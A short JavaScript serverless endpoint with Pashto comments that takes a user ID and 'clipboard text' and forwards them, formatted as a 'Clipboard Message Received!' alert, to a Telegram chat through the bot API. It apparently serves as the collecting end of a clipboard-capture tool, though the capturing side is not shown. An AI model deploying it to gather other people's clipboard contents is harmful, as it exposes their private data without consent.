export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Only POST allowed");

  const { uid, text } = req.body;
  const botToken = process.env.BOT_TOKEN;

  if (!uid || !text) {
    return res.status(400).json({ error: "Missing uid or text" });
  }

  // 🕒 اوسنی وخت جوړول
  const time = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Kabul",
    hour12: false
  });

  // 📩 ښکلی پیغام جوړول
  const message = 
`╭━━━⫸🔘*𝗖𝗹𝗶𝗽𝗯𝗼𝗮𝗿𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱!* ⫷━━━╮

👤 *User ID:* \`${uid}\`
🕒 *Time:* \`${time}\`

📝 *Clipboard Text:*
${text}

╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
──────╮
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 𝗪𝗔𝗖𝗜𝗤
╰────────────╯`;

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: uid,
      text: message,
      parse_mode: "Markdown"
    })
  });

  const data = await response.json();

  if (!data.ok) {
    return res.status(500).json({ error: "Failed to send message", details: data });
  }

  res.status(200).json({ ok: true });
} 
